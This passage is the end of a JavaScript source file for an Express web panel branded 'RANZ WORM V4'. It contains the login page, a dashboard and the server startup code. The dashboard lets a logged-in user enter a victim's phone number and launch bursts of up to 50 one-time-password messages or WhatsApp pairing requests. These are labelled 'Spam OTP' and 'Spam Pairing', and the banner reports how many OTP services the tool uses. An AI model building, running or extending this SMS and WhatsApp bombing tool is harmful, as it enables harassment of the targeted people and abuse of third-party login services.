                        <div class="telegram-chip"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.05-.2-.07-.05-.17-.03-.24-.02-.1.02-1.73 1.1-4.88 3.22-.46.32-.88.47-1.25.46-.41-.01-1.2-.23-1.79-.42-.72-.24-1.29-.36-1.24-.76.03-.21.31-.42.85-.64 3.34-1.45 5.56-2.41 6.67-2.87 3.17-1.32 3.83-1.55 4.26-1.56.09 0 .3.02.43.13.11.09.14.22.15.26.01.04.02.15.01.24z"/></svg>@RanzWormBot</div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-text">✦ Engineered by Ranzkecebet ✦</div>
    </div>
    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-box">
            <div class="loading-spinner"></div>
            <div class="loading-title">AUTHENTICATING</div>
            <div class="loading-steps">
                <div class="loading-step" id="ls1"><div class="step-dot"></div><span class="step-label">Verifying credentials...</span></div>
                <div class="loading-step" id="ls2"><div class="step-dot"></div><span class="step-label">Secure tunnel...</span></div>
                <div class="loading-step" id="ls3"><div class="step-dot"></div><span class="step-label">Decrypting access key...</span></div>
                <div class="loading-step" id="ls4"><div class="step-dot"></div><span class="step-label">Initializing dashboard...</span></div>
            </div>
        </div>
    </div>
    <script>
        const canvas=document.getElementById('blackhole-canvas'),ctx=canvas.getContext('2d');
        let w,h,particles=[],time=0;
        function resize(){w=canvas.width=window.innerWidth;h=canvas.height=window.innerHeight}resize();window.addEventListener('resize',resize);
        class SP{constructor(){this.reset()}reset(){const a=Math.random()*Math.PI*2,r=50+Math.random()*200;this.x=w/2+Math.cos(a)*r;this.y=h/2+Math.sin(a)*r;this.vx=(w/2-this.x)*.001;this.vy=(h/2-this.y)*.001;this.size=Math.random()*1.5+.5;this.opacity=Math.random()*.6+.2;this.color=['#8b5cf6','#ec4899','#3b82f6','#06b6d4','#ffffff'][Math.floor(Math.random()*5)];this.life=1;this.decay=.002+Math.random()*.003}
        update(){const dx=w/2-this.x,dy=h/2-this.y,dist=Math.sqrt(dx*dx+dy*dy),force=.8/(dist*.05+1);this.vx+=dx*force*.01;this.vy+=dy*force*.01;this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life-=this.decay;if(this.life<=0||dist<30)this.reset()}
        draw(ct){ct.beginPath();ct.arc(this.x,this.y,this.size,0,Math.PI*2);ct.fillStyle=this.color;ct.globalAlpha=this.opacity*this.life;ct.fill();ct.globalAlpha=1}}
        for(let i=0;i<300;i++)particles.push(new SP());
        function drawBH(){const cx=w/2,cy=h/2;for(let i=3;i>=0;i--){const r=30+i*15+Math.sin(time*.5+i)*5;const g=ctx.createRadialGradient(cx,cy,r*.5,cx,cy,r);g.addColorStop(0,'rgba(139,92,246,0)');g.addColorStop(.5,\`rgba(139,92,246,\${.015+i*.005})\`);g.addColorStop(1,'rgba(139,92,246,0)');ctx.beginPath();ctx.arc(cx,cy,r,0,Math.PI*2);ctx.fillStyle=g;ctx.fill()}
        const cg=ctx.createRadialGradient(cx,cy,0,cx,cy,40);cg.addColorStop(0,'rgba(5,3,20,1)');cg.addColorStop(.6,'rgba(10,5,40,.8)');cg.addColorStop(1,'rgba(20,10,60,0)');ctx.beginPath();ctx.arc(cx,cy,40,0,Math.PI*2);ctx.fillStyle=cg;ctx.fill();ctx.save();ctx.translate(cx,cy);ctx.rotate(time*.3);ctx.beginPath();ctx.ellipse(0,0,60,20,0,0,Math.PI*2);ctx.fillStyle=ctx.createRadialGradient(cx,cy,35,cx,cy,80);ctx.fill();ctx.restore()}
        function animate(){ctx.fillStyle='rgba(2,0,8,.15)';ctx.fillRect(0,0,w,h);drawBH();particles.forEach(p=>{p.update();p.draw(ctx)});time++;requestAnimationFrame(animate)}animate();
        const sc=document.getElementById('stars');for(let i=0;i<200;i++){const s=document.createElement('div');s.className='star';s.style.left=Math.random()*100+'%';s.style.top=Math.random()*100+'%';s.style.setProperty('--d',(2+Math.random()*4)+'s');s.style.setProperty('--delay',Math.random()*5+'s');sc.appendChild(s)}
        document.getElementById('login-form').addEventListener('submit',async function(e){e.preventDefault();const u=document.getElementById('username').value.trim(),p=document.getElementById('password').value.trim(),er=document.getElementById('login-error'),btn=document.getElementById('submit-btn'),ov=document.getElementById('loading-overlay');if(!u||!p){er.textContent='✦ All fields required';er.classList.add('show');return}er.classList.remove('show');ov.classList.add('show');btn.disabled=true;const st=['ls1','ls2','ls3','ls4'];for(let i=0;i<st.length;i++){await new Promise(r=>setTimeout(r,700+Math.random()*500));document.getElementById(st[i]).classList.add('done')}try{const r=await fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});const d=await r.json();if(d.status==='success'){await new Promise(r=>setTimeout(r,800));window.location.href='/dashboard'}else{ov.classList.remove('show');er.textContent='✦ '+(d.message||'Auth failed');er.classList.add('show');btn.disabled=false;st.forEach(s=>document.getElementById(s).classList.remove('done'))}}catch(ex){ov.classList.remove('show');er.textContent='✦ Connection error';er.classList.add('show');btn.disabled=false;st.forEach(s=>document.getElementById(s).classList.remove('done'))}});
        const style=document.createElement('style');style.textContent='@property --angle{syntax:"<angle>";initial-value:0deg;inherits:false}';document.head.appendChild(style);
    </script>
</body>
</html>`;

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RanzS - Dashboard</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;background:#020008;min-height:100vh;color:white;display:flex;justify-content:center;align-items:center;padding:20px}
        .container{width:550px;max-width:100%}
        .card{background:rgba(10,8,30,.9);border:1px solid rgba(139,92,246,.3);border-radius:24px;padding:32px 24px;box-shadow:0 0 50px rgba(139,92,246,.15),0 0 0 4px rgba(139,92,246,.05);position:relative;overflow:hidden}
        .card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(139,92,246,.08) 0%,transparent 70%);animation:rotate 20s linear infinite}
        @keyframes rotate{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .card-content{position:relative;z-index:1}
        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;padding-bottom:16px;border-bottom:1px solid rgba(255,255,255,.05)}
        .title{font-family:'Orbitron',sans-serif;font-size:20px;font-weight:700;background:linear-gradient(135deg,#fff,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .subtitle{font-size:10px;color:rgba(255,255,255,.3);font-family:'Orbitron',sans-serif;letter-spacing:3px;margin-top:4px}
        .user-badge{background:rgba(139,92,246,.15);border:1px solid rgba(139,92,246,.3);border-radius:20px;padding:6px 14px;font-size:11px;color:#8b5cf6;font-family:'JetBrains Mono',monospace}
        .logout-btn{background:transparent;border:1px solid rgba(239,68,68,.3);color:#ef4444;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:11px;font-family:'JetBrains Mono',monospace;transition:all .3s}
        .logout-btn:hover{background:rgba(239,68,68,.1)}
        .menu-label{font-size:10px;letter-spacing:3px;color:rgba(255,255,255,.4);font-family:'Orbitron',sans-serif;margin-bottom:12px}
        .menu-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
        .menu-item{padding:16px 10px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.06);border-radius:14px;text-align:center;cursor:pointer;transition:all .3s;font-size:11px;font-family:'JetBrains Mono',monospace;color:rgba(255,255,255,.6)}
        .menu-item:hover{border-color:rgba(139,92,246,.3);background:rgba(139,92,246,.05)}
        .menu-item.active{border-color:#8b5cf6;background:rgba(139,92,246,.15);box-shadow:0 0 20px rgba(139,92,246,.2);color:white}
        .menu-icon{font-size:22px;margin-bottom:6px;display:block}
        .target-section{display:none;padding:20px;background:rgba(255,255,255,.01);border:1px solid rgba(255,255,255,.05);border-radius:16px;margin-top:8px}
        .target-section.show{display:block}
        .input-group{margin-bottom:14px}
        .input-label{font-size:10px;letter-spacing:2px;color:rgba(255,255,255,.4);font-family:'Orbitron',sans-serif;margin-bottom:6px;display:block}
        .input-field{width:100%;padding:12px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:10px;color:white;font-size:14px;outline:none;transition:all .3s;font-family:'JetBrains Mono',monospace}
        .input-field:focus{border-color:#8b5cf6;box-shadow:0 0 15px rgba(139,92,246,.1)}
        .btn{width:100%;padding:14px;border:none;border-radius:12px;color:white;font-size:14px;font-weight:600;cursor:pointer;transition:all .3s;font-family:'Orbitron',sans-serif;letter-spacing:2px}
        .btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626)}
        .btn-danger:hover{box-shadow:0 10px 25px rgba(239,68,68,.4);transform:translateY(-2px)}
        .btn:disabled{opacity:.4;cursor:not-allowed;transform:none!important}
        .progress-container{margin:10px 0;display:none}
        .progress-container.show{display:block}
        .progress-bar-bg{width:100%;height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden}
        .progress-bar-fill{height:100%;background:linear-gradient(90deg,#8b5cf6,#ec4899);border-radius:2px;transition:width .3s;width:0%}
        .progress-text{font-size:10px;color:rgba(255,255,255,.4);font-family:'JetBrains Mono',monospace;text-align:right;margin-top:4px}
        .log-box{margin-top:10px;padding:12px;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.04);border-radius:10px;max-height:250px;overflow-y:auto;font-size:10px;font-family:'JetBrains Mono',monospace;color:rgba(255,255,255,.5);display:none}
        .log-box.show{display:block}
        .log-entry{padding:3px 0;border-bottom:1px solid rgba(255,255,255,.02)}
        .log-entry.success{color:#22c55e}.log-entry.error{color:#ef4444}.log-entry.info{color:#8b5cf6}
        .status-badge{display:none;padding:6px 12px;border-radius:20px;font-size:10px;font-family:'JetBrains Mono',monospace;letter-spacing:1px;margin:8px 0;text-align:center}
        .status-badge.processing{background:rgba(234,179,8,.2);color:#eab308;border:1px solid rgba(234,179,8,.3)}
        .status-badge.complete{background:rgba(34,197,94,.2);color:#22c55e;border:1px solid rgba(34,197,94,.3)}
        .status-badge.show{display:block}
        .pairing-code{display:none;padding:12px;background:rgba(0,0,0,.5);border:1px solid rgba(139,92,246,.3);border-radius:10px;text-align:center;font-family:'Orbitron',monospace;font-size:16px;color:#8b5cf6;letter-spacing:3px;margin:8px 0}
        .pairing-code.show{display:block}
        .footer-text{text-align:center;margin-top:16px;font-size:10px;letter-spacing:3px;color:rgba(255,255,255,.1);font-family:'Orbitron',sans-serif}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-content">
                <div class="header">
                    <div>
                        <div class="title">DASHBOARD</div>
                        <div class="subtitle">Atlantic System v4</div>
                        <div class="user-badge" id="user-badge" style="margin-top:8px;">Not logged in</div>
                    </div>
                    <button class="logout-btn" onclick="logout()">EXIT</button>
                </div>
                <div class="menu-label">Select Module</div>
                <div class="menu-grid">
                    <div class="menu-item" data-menu="otp" onclick="selectMenu('otp',this)"><span class="menu-icon">📱</span>Spam OTP</div>
                    <div class="menu-item" data-menu="pairing" onclick="selectMenu('pairing',this)"><span class="menu-icon">🔗</span>Spam Pairing</div>
                    <div class="menu-item" data-menu="connect" onclick="selectMenu('connect',this)"><span class="menu-icon">📡</span>Connect WA</div>
                </div>
                <div class="target-section" id="target-section">
                    <div class="menu-label" id="section-title">Target</div>
                    <div class="input-group"><label class="input-label">Phone Number</label><input type="text" class="input-field" id="target-input" placeholder="628xxxxxxxxxx"></div>
                    <div class="input-group" id="count-group"><label class="input-label">Amount (Max 50)</label><input type="number" class="input-field" id="count-input" value="10" min="1" max="50"></div>
                    <div class="status-badge processing" id="status-processing">PROCESSING...</div>
                    <div class="status-badge complete" id="status-complete">COMPLETE</div>
                    <div class="progress-container" id="progress-container"><div class="progress-bar-bg"><div class="progress-bar-fill" id="progress-fill"></div></div><div class="progress-text" id="progress-text">0%</div></div>
                    <div class="pairing-code" id="pairing-display"><div style="font-size:10px;color:rgba(255,255,255,.4);margin-bottom:4px;">PAIRING CODE</div><div id="pairing-code-text">----</div></div>
                    <button class="btn btn-danger" id="send-btn" onclick="execute()">EXECUTE</button>
                    <div class="log-box" id="log-box"></div>
                </div>
            </div>
        </div>
        <div class="footer-text">✦ Ranzkecebet ✦</div>
    </div>
    <script>
        let currentUser=null,selectedMenu=null,eventSource=null,isProcessing=false;
        async function checkSession(){try{const r=await fetch('/check-session');const d=await r.json();if(d.status==='success'){currentUser=d;document.getElementById('user-badge').textContent='@'+d.username;connectSSE(d.username)}else{window.location.href='/'}}catch(e){window.location.href='/'}}checkSession();
        function connectSSE(u){if(eventSource)eventSource.close();eventSource=new EventSource('/events?username='+encodeURIComponent(u));eventSource.onmessage=function(e){try{handleEvent(JSON.parse(e.data))}catch(ex){}};eventSource.onerror=()=>setTimeout(()=>connectSSE(u),5000)}
        function handleEvent(d){const lb=document.getElementById('log-box'),pf=document.getElementById('progress-fill'),pt=document.getElementById('progress-text'),pc=document.getElementById('progress-container');if(d.progress!==undefined){pc.classList.add('show');pf.style.width=d.progress+'%';pt.textContent=d.progress+'%'}if(d.type==='otp_result'||d.type==='pairing_result'){lb.classList.add('show');const cls=d.status==='sent'?'success':'error';let msg='#'+d.result.number+' | ';if(d.type==='otp_result')msg+=d.result.service+' | ';msg+=d.result.code||d.result.message||d.status;lb.innerHTML+='<div class="log-entry '+cls+'">'+msg+'</div>';lb.scrollTop=lb.scrollHeight;if(d.result.code&&d.result.code!=='N/A'){document.getElementById('pairing-display').classList.add('show');document.getElementById('pairing-code-text').textContent=d.result.code}}if(d.type==='status'){lb.classList.add('show');lb.innerHTML+='<div class="log-entry info">'+d.message+'</div>';lb.scrollTop=lb.scrollHeight}if(d.type==='complete'){isProcessing=false;document.getElementById('send-btn').disabled=false;document.getElementById('send-btn').textContent='EXECUTE';document.getElementById('status-processing').classList.remove('show');document.getElementById('status-complete').classList.add('show');lb.innerHTML+='<div class="log-entry success">✅ '+d.message+'</div>';lb.scrollTop=lb.scrollHeight;setTimeout(()=>document.getElementById('status-complete').classList.remove('show'),5000)}if(d.type==='error'){lb.classList.add('show');lb.innerHTML+='<div class="log-entry error">❌ '+d.message+'</div>';lb.scrollTop=lb.scrollHeight}if(d.type==='pairing_code'){document.getElementById('pairing-display').classList.add('show');document.getElementById('pairing-code-text').textContent=d.code;lb.classList.add('show');lb.innerHTML+='<div class="log-entry info">🔑 Code: '+d.code+'</div>'}}
        function selectMenu(m,el){selectedMenu=m;document.querySelectorAll('.menu-item').forEach(e=>e.classList.remove('active'));el.classList.add('active');const sec=document.getElementById('target-section'),title=document.getElementById('section-title'),cg=document.getElementById('count-group');sec.classList.add('show');resetUI();if(m==='otp'){title.textContent='Spam OTP Target';cg.style.display='block'}else if(m==='pairing'){title.textContent='Spam Pairing Target';cg.style.display='block'}else if(m==='connect'){title.textContent='Connect WhatsApp';cg.style.display='none'}}
        function resetUI(){document.getElementById('log-box').innerHTML='';document.getElementById('log-box').classList.remove('show');document.getElementById('pairing-display').classList.remove('show');document.getElementById('pairing-code-text').textContent='----';document.getElementById('progress-fill').style.width='0%';document.getElementById('progress-text').textContent='0%';document.getElementById('progress-container').classList.remove('show');document.getElementById('status-processing').classList.remove('show');document.getElementById('status-complete').classList.remove('show')}
        async function execute(){if(!currentUser)return alert('Session expired');if(!selectedMenu)return alert('Select module');if(isProcessing)return alert('Still processing');const target=document.getElementById('target-input').value.trim();if(!target)return alert('Enter phone number');isProcessing=true;const btn=document.getElementById('send-btn');btn.disabled=true;btn.textContent='PROCESSING...';resetUI();document.getElementById('status-processing').classList.add('show');document.getElementById('progress-container').classList.add('show');document.getElementById('log-box').classList.add('show');const lb=document.getElementById('log-box');lb.innerHTML+='<div class="log-entry info">🚀 Starting...</div>';let endpoint,body;if(selectedMenu==='otp'){const c=parseInt(document.getElementById('count-input').value)||10;endpoint='/spam-otp';body={target,count:Math.min(c,50),username:currentUser.username}}else if(selectedMenu==='pairing'){const c=parseInt(document.getElementById('count-input').value)||5;endpoint='/spam-pairing';body={target,count:Math.min(c,50),username:currentUser.username}}else if(selectedMenu==='connect'){endpoint='/connect-whatsapp';body={target,username:currentUser.username}}try{const r=await fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});const d=await r.json();if(d.status==='error'){lb.innerHTML+='<div class="log-entry error">❌ '+d.message+'</div>';isProcessing=false;btn.disabled=false;btn.textContent='EXECUTE'}}catch(ex){lb.innerHTML+='<div class="log-entry error">❌ '+ex.message+'</div>';isProcessing=false;btn.disabled=false;btn.textContent='EXECUTE'}}
        function logout(){document.cookie='session=;expires=Thu,01 Jan 1970 00:00:00 UTC;path=/;';window.location.href='/'}
    </script>
</body>
</html>`;

// =============================================
// START SERVER
// =============================================

function printBanner() {
    console.clear();
    console.log('\x1b[45m\x1b[1m\x1b[37m ╔══════════════════════════════════════════════════════════════╗ \x1b[0m');
    console.log('\x1b[45m\x1b[1m\x1b[37m ║    🐍 RANZ WORM V4 - ANTI ERROR 100% SYSTEM 🐍             ║ \x1b[0m');
    console.log('\x1b[45m\x1b[1m\x1b[37m ║    Engineered by Ranzkecebet | Zero Crash Mode             ║ \x1b[0m');
    console.log('\x1b[45m\x1b[1m\x1b[37m ╚══════════════════════════════════════════════════════════════╝ \x1b[0m');
    console.log('');
    console.log(`\x1b[36m[+]\x1b[0m Port: \x1b[33m${CONFIG.PORT}\x1b[0m`);
    console.log(`\x1b[36m[+]\x1b[0m OTP APIs: \x1b[32m${Object.keys(OTP_APIS).length} Services\x1b[0m`);
    console.log(`\x1b[36m[+]\x1b[0m Anti-Error: \x1b[32mActive\x1b[0m`);
    console.log(`\x1b[36m[+]\x1b[0m Retry Mechanism: \x1b[32m${CONFIG.RETRY_ATTEMPTS} attempts\x1b[0m`);
    console.log('');
}

// Initialize Telegram Bot
initTelegramBot();

// Start Express Server
const server = app.listen(CONFIG.PORT, '0.0.0.0', () => {
    printBanner();
    Logger.log('Server started on port ' + CONFIG.PORT);
    Logger.success('System ready - Anti Error 100%');
});

global.server = server;

// Handle server errors
server.on('error', (err) => {
    Logger.error(`Server error: ${err.message}`);
    if (err.code === 'EADDRINUSE') {
        Logger.error(`Port ${CONFIG.PORT} is already in use. Try another port.`);
        process.exit(1);
    }
});

server.on('listening', () => {
    Logger.info(`Server listening on port ${CONFIG.PORT}`);
});
